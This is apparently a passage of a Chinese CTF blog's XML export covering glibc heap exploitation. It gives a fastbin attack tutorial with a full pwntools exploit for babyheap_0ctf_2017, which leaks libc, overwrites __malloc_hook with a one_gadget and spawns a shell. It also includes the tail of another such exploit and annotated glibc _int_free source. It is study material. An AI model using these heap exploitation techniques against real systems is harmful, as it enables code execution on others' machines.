class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">one_gadget = libcbase + <span class="number">0xf02a4</span></span><br><span class="line">realloc_addr = libcbase + <span class="number">0x846c0</span></span><br><span class="line">write(<span class="number">4</span>, <span class="number">0x1b</span>, flat(cyclic(<span class="number">0xb</span>), one_gadget, realloc_addr + <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
        <tag>BUUOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 12 - fastbin attack</title>
    <url>/2020/05/heap-12-fastbin_attack/</url>
    <content><![CDATA[<p>利用Fastbin attack进行任意地址读写</p>
<h2 id="1-原理">1. 原理</h2>
<ul>
<li>fastbin attack 存在的原因在于 fastbin 是使用fast chunk的fd指针，即单链表来维护释放的堆块的</li>
<li>并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空</li>
<li>利用的条件是
<ul>
<li>能够控制fast chunk的fd指针</li>
<li>漏洞发生在fast chunk类型上</li>
</ul>
</li>
</ul>
<h2 id="2-Arbitrary-Alloc">2. Arbitrary Alloc</h2>
<h3 id="1-介绍">1) 介绍</h3>
<ul>
<li>
<p>如果我们更改fastbin链尾的fast chunk fd指针为我们的目的地址<br>
则在几次malloc后，fastbin指针就会指向我们的目的地址<br>
下一次malloc fast_chunk就会取得目的地址的指针，然后就可以进行读写了（操作取决于程序）</p>
<a id="more"></a>
<ul>
<li>
<p>例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始时malloc两个fast chunk</span></span><br><span class="line"><span class="keyword">char</span> * fast_chunk1 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="keyword">char</span> * fast_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放第二个fast chunk</span></span><br><span class="line"><span class="built_in">free</span>(fast_chunk2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时fastbin链上的情况为</span></span><br><span class="line">fastbinY[<span class="number">2</span>] -&gt; fast_chunk2 -&gt; <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果此时利用堆溢出，在fast_chunk1内存处进行内存写，使fast_chunk2的fd指针指向其目的地址（假设目的地址为0x7f1234)</span></span><br><span class="line"><span class="comment">// 那么此时fastbin链上的情况就为</span></span><br><span class="line">fastbinY[<span class="number">2</span>] -&gt; fast_chunk2 -&gt; <span class="number">0x7f1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行一次malloc</span></span><br><span class="line">fast_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="comment">// 此时fastbin链上的情况为</span></span><br><span class="line">fastbinY[<span class="number">2</span>]  -&gt; <span class="number">0x7f1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 所以再malloc一次就可以得到其指针了</span></span><br><span class="line"><span class="keyword">char</span> * targetPointer = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>注意，申请fast chunk时，malloc内会有相应的检测，所以我们必须尝试绕过</p>
<ul>
<li>
<ol>
<li>所申请的fast chunk， 其 PREV_INUSE 必须始终为1</li>
</ol>
<ul>
<li>目的地址一般都是__malloc_hook指针附近，该位置附近的内存中，0x7fxxxx的值会比较容易找到，所以在查找可用的目的地址时，fake_fast_chunk的size最好为0x7f</li>
</ul>
</li>
<li>
<ol start="2">
<li>所申请的fast chunk, 其所在的fastbin的索引必须和其size所显示的索引一致</li>
</ol>
<ul>
<li>即，如果目的地址上的fake_fast_chunk的size为0x7f，那么上述例子中，fast_chunk2的size最好为0x70，此时fake_fast_chunk所在fastbin的索引是正确的，可以通过malloc的检测。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-一个稍微有点难的例子-——-babyheap-0ctf-2017">2) 一个稍微有点难的例子 —— babyheap_0ctf_2017</h3>
<h4 id="分析">分析</h4>
<ul>
<li>这个程序保护全开，但在fill函数处，有一个无限制写入的堆溢出漏洞</li>
<li>所以我们可以尝试通过fastbin attack, malloc到__malloc_hook指针所在的内存处</li>
<li>然后通过修改__malloc_hook为one_gadget的地址，再malloc一下就get shell</li>
</ul>
<blockquote>
<p>但这里有个问题，如何获取libc基地址</p>
</blockquote>
<ul>
<li>我们可以利用一个特性：<br>
当unsorted bin链上只有一个unsorted chunk，其fd和bk指针都是指向main_arena的。<br>
而main_arena在libc的data段上，所以只要泄露出其fd或者bk指针，通过计算偏移，就可以计算处libc的基地址</li>
</ul>
<blockquote>
<p>现在我们将问题转化为，如何获取 unsorted chunk的fd指针值</p>
</blockquote>
<ul>
<li>
<p>我们可以这样做</p>
<ul>
<li>
<p>首先malloc4块chunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> * fast_chunk_1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">// 为啥0x60，因为此时的fast chunk的size为0x70，与size为0x7f的fast chunk处于同一个索引的fast bin链</span></span><br><span class="line"><span class="keyword">char</span> * fast_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">char</span> * unsorted_chunk = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">// 防止unsorted chunk在free时，与top chunk合并</span></span><br><span class="line"><span class="keyword">char</span> * fast_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/heap-12-fastbin_attack/malloc4chunk.png" alt="img"></p>
</li>
<li>
<p>然后通过堆溢出，修改fast_chunk_2的size为 0x180，使 unsorted chunk 完全包含于fast_chunk_2<br>
<img src="/2020/05/heap-12-fastbin_attack/coverUnsortedChunk.png" alt="img"></p>
</li>
<li>
<p>然后free掉fast_chunk_2 再malloc(0x170)回来，此时fast_chunk_2的读写范围扩大了</p>
</li>
<li>
<p>这时候我们要释放unsorted chunk，由于unsorted bin的size在malloc fast_chunk_2时被清零了，所以需要修复一下<br>
修复好后再free掉unsorted chunk<br>
<img src="/2020/05/heap-12-fastbin_attack/recoverUnsortedChunk.png" alt="img"></p>
</li>
<li>
<p>此时便可以通过fast_chunk_2 来输出main_arena地址</p>
</li>
</ul>
</li>
<li>
<p>得知main_arena地址，计算出__malloc_hook和one_gadget地址后，我们便可以实现一次fastbin attack</p>
<ul>
<li>注意此时fast_chunk_2的size值为0x181,所以首先我们就修改fast_chunk_2的size为0x71<br>
否则free时，fast_chunk_2不会被放进fast bin里<br>
然后把该chunk free掉<br>
<img src="/2020/05/heap-12-fastbin_attack/freeFast_chunk_2.png" alt="img"></li>
<li>然后现在我们来找找目标地址附近，该找哪一块空间，来作为fake_fast_chunk的起始地址<br>
我们很容易就可以发现，这个地址符合要求。<br>
<img src="/2020/05/heap-12-fastbin_attack/findfake.png" alt="img"></li>
<li>接下来修改fast_chunk_2的fd指针为fake_fast_chunk的地址<br>
<img src="/2020/05/heap-12-fastbin_attack/fakeChunk_fastbin.png" alt="img"></li>
</ul>
</li>
<li>
<p>然后两次malloc(0x60)，就可以申请到目标地址的内存了</p>
</li>
<li>
<p>接下来就是修改__malloc_hook为one_gadget，然后再来个malloc就可以get shell.</p>
</li>
</ul>
<h3 id="EXP">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">29766</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">"./babyheap_0ctf_2017"</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">"Size: "</span>, str(len(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Command: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    io.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">    msg = io.recvuntil(<span class="string">"1. Allocate"</span>)</span><br><span class="line">    <span class="keyword">return</span> msg[:<span class="number">-11</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>) </span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>, flat(cyclic(<span class="number">0x18</span>), <span class="number">0x181</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">allocate(<span class="number">0x170</span>)</span><br><span class="line">fill(<span class="number">1</span>, flat(cyclic(<span class="number">0x68</span>), <span class="number">0x111</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">msg = dump(<span class="number">1</span>)</span><br><span class="line">arena_addr = u64(msg[<span class="number">0x70</span>:<span class="number">0x78</span>]) - <span class="number">88</span></span><br><span class="line">libc_addr = arena_addr - (<span class="number">0x7ff41d02eb20</span> - <span class="number">0x7ff41cc6a000</span>)</span><br><span class="line">malloc_hook_addr = arena_addr - <span class="number">0x10</span></span><br><span class="line">fake_fastchunk_addr = malloc_hook_addr - <span class="number">0x23</span></span><br><span class="line">one_gadget_addr = libc_addr + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"arena address: "</span> + hex(arena_addr))</span><br><span class="line">log.success(<span class="string">"libc address: "</span> + hex(libc_addr))</span><br><span class="line">log.success(<span class="string">"__malloc_hook address: "</span> + hex(malloc_hook_addr))</span><br><span class="line">log.success(<span class="string">"fake_fastchunk address: "</span> + hex(fake_fastchunk_addr))</span><br><span class="line">log.success(<span class="string">"one_gadget address: "</span> + hex(one_gadget_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>, flat(cyclic(<span class="number">0x18</span>), <span class="number">0x71</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">fill(<span class="number">0</span>, flat(cyclic(<span class="number">0x18</span>), <span class="number">0x71</span>, fake_fastchunk_addr))</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">fill(<span class="number">2</span>, flat(cyclic(<span class="number">19</span>), one_gadget_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
        <tag>BUUOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 10 - _int_free的相关操作</title>
    <url>/2020/05/heap-10-_int_free_process/</url>
    <content><![CDATA[<p>_int_free的一系列操作</p>
<a id="more"></a>
<blockquote>
<p>注意！ 以下步骤若未明确标明退出函数，则表示在执行完当前操作后，继续执行剩余操作</p>
</blockquote>
<h2 id="1-判断当前chunk的大小是否异常小或者异常大-内存有无对齐">1. 判断当前chunk的大小是否异常小或者异常大,内存有无对齐</h2>
<ul>
<li>如果是，则 <strong>报错退出</strong></li>
</ul>
<h2 id="2-如果当前chunk大小-小于-fast-chunk的最大值">2. 如果当前chunk大小 小于 fast chunk的最大值</h2>
<ul>
<li>判断下一个内存相邻chunk的size是否异常大或异常小，如果是，则 <strong>报错退出</strong></li>
<li>判断当前fastbin链头的chunk是否为当前chunk(防止 <strong>连续的</strong> double free)。如果是，则 <strong>报错退出</strong></li>
<li>将当前chunk放入fastbin链头</li>
<li>如果实际放入的fast bin，其index与当前chunk的预期index不同，则 <strong>报错退出</strong></li>
<li>如果上面的都没出错的话，则函数执行结束，<strong>函数返回</strong></li>
</ul>
<h2 id="3-判断当前chunk是否是调用mmap分配的">3. 判断当前chunk是否是调用mmap分配的</h2>
<ul>
<li>如果是，则
<ul>
<li>如果当前chunk为top chunk，则意味着double free， <strong>报错退出</strong>。因为top chunk为free chunk，不可再被free</li>
<li>如果当前chunk的下一个内存相邻chunk(next chunk)，其内存起始地址超过了top chunk的最大内存地址，则 <strong>报错退出</strong></li>
<li>如果当前chunk是inuse的，则 <strong>报错退出</strong></li>
<li>如果next chunk的size异常大或者异常小，则 <strong>报错退出</strong></li>
<li>如果上一个内存相邻chunk是free chunk，则将上一个chunk unlink，并与当前chunk合并</li>
<li>判断next chunk是否为top chunk
<ul>
<li>如果不是
<ul>
<li>判断next chunk是否是空闲的（inuse）
<ul>
<li>如果是，则与当前待释放chunk合并</li>
<li>否则，清空其PREV_INUSE标志位</li>
</ul>
</li>
<li>将当前待释放chunk放入unsorted bin里</li>
</ul>
</li>
<li>如果是
<ul>
<li>则当前chunk与top chunk合并</li>
</ul>
</li>
</ul>
</li>
<li>如果当前chunk的size大于某个临界点（临界点大小默认65535bytes/64KB）
<ul>
<li>如果存在fast chunk，则进行malloc_consolidate</li>
<li>判断当前arena是否为main_arena
<ul>
<li>如果是，并且top chunk的大小超过某个临界点，则调用systrim返还多余内存</li>
<li>否则，调用heap_trim返还内存给操作系统</li>
</ul>
</li>
</ul>
</li>
<li>函数执行结束，<strong>函数返回</strong></li>
</ul>
</li>
<li>如果不是，则调用munmap函数释放当前chunk的内存，函数执行结束，<strong>函数返回</strong></li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 9 - _int_free 源码及其部分分析</title>
    <url>/2020/05/heap-9-__int_free_source/</url>
    <content><![CDATA[<p><code>__int_free</code> —— 核心内存释放函数</p>
<a id="more"></a>
<blockquote>
<p>所有的分析都以注释的形式添加进源代码中，方便阅读</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by "design" from some intruder.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前chunk的大小异常大，或者地址不是按 2SIZE_SZ 对齐，则报错退出</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查一下chunk size是否比最小chunk size还要小，或者是否没有对齐内存</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 进行一系列的检查</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前chunk的大小满足fastbin的要求，则放入fastbin</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">        bordering top into fastbins</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// 如果TRIM_FASTBINS设置了，就不能把与top chunk相邻的chunk放入fastbin里</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">      )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断下一个chunk的大小是否异常小或者异常大</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">        of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">        after getting the lock.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">        mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">        chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">          || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (! have_lock)</span><br><span class="line">      &#123;</span><br><span class="line">        (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果相关标志设置了，则初始化当前chunk的内存</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    <span class="comment">// 将当前fast free chunk放入fast bin里</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">          (i.e., double free).  */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 判断fastbin的头chunk是否就是我们将要free的chunk，以防止正常用户的double free(hacker另说)</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">          size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">          only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">          deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">      p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果实际放入的fastbin index与预期的不同，则error</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">// 如果当前chunk不是fast bin，并且也不是mmap来的</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="comment">// 判断当前chunk是否top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"double free or corruption (top)"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="comment">// 判断下一个chunk的地址是否超出top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">      &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">      &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"double free or corruption (out)"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="comment">// 判断当前chunk是否是inuse的</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"double free or corruption (!prev)"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断下一个chunk的大小是否异常大或者异常小</span></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="comment">// 如果上一个内存相邻的chunk是free chunk，则于其合并</span></span><br><span class="line">    <span class="comment">// 注意：由于fast chunk的prev_inuse始终为1，所以fast_chunk不会被合并</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果下一个chunk不为top chunk,则清除下一个chunk的prev_inuse位</span></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      <span class="comment">// 如果下一个内存相邻的chunk为free chunk，则与其合并</span></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">      &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">      not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">      been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="comment">// 把当前chunk 无论大小，全部放进unsorted bin里</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span 